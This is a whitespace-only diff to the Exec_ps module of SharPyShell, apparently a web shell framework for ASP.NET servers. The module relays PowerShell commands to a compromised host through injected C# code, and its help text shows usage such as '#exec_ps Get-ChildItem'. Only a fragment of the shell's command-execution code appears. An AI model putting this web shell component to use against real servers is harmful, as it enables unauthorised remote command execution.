@@ -16,14 +16,14 @@ class Exec_ps(Module):
         of the process.
         Note that you should use the 'cd' command of the prompt to change your working directory.
         You should never use '#exec_ps cd C:\dir', but instead 'cd C:\dir'.
-    
+
         Usage:
             #exec_ps os_command [args]
-            
+
         Positional arguments:
             os_command               command supported by powershell.exe
             args                     the commandline arguments to be passed
-            
+
         Examples:
             List current directory files:
                 #exec_ps Get-ChildItem
@@ -35,7 +35,7 @@ class Exec_ps(Module):
     _runtime_code = r"""
                     using System;using System.IO;using System.Diagnostics;using System.Text;
                     public class SharPyShell
-                    {                    
+                    {
                         string ExecPs(string encoded_command, string working_path)
                         {
                             ProcessStartInfo pinfo = new ProcessStartInfo();
